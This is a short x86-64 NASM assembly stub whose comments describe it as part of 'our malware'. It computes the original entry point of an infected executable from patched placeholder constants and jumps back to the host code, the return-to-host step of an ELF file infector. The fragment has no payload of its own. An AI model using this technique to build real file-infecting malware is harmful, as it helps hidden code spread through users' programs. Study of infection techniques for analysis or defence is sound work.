BITS 64
%define VSIZE 0xDEADBEEFDEADBEEF   
%define ENTRY 0xBAADF00DBAADF00D
%define START 0xB16B00B5B16B00B5   

    ; - position independent executables move addresses, so
    ; 1) call to get_foo instruction pointer into rax then 
    ; 2) load our constants into registers r9, r10, r11
    ; 3) subtract our malware size, (& subtract 5!)
    ;   *(the size of the get_foo instruction)
    ; 4) subtract patched entry offset from rax  
    ; 5) add our original entry point to r11
    ; 6) finally jmp to rax
    call get_foo
    mov r9, VSIZE
    mov r10, ENTRY
    mov r11, START
    sub rax, r9
    sub rax, 5
    sub rax, r10
    add rax, r11
    jmp rax
get_foo:
    mov rax, [rsp]
    ret